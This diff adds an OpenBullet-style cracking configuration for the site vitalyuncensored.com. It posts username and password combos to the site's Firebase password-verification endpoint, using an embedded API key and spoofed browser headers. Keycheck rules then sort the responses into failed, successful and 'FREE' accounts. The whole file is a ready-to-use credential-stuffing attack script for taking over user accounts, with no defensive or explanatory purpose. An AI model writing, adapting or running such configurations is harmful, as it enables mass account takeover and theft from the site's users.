@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "vitalyuncensored.com",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-10T01:42:28.1398209+03:00",
+  "AdditionalInfo": "",
+  "Author": "rileyreid",
+  "Version": "1.1.2",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyCOuRrRMUyNaArw0BZI9kyeLdntRn8RdW0" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"returnSecureToken\":true}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://vitalyuncensored.com/login" 
+  HEADER "X-Client-Version: Firefox/JsCore/6.0.4/FirebaseCore-web" 
+  HEADER "Origin: https://vitalyuncensored.com" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"message\": \"EMAIL_NOT_FOUND\"," 
+  KEYCHAIN Success OR 
+    KEY "  \"registered\": true," 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"expiresIn\": \"3600\"" 
+
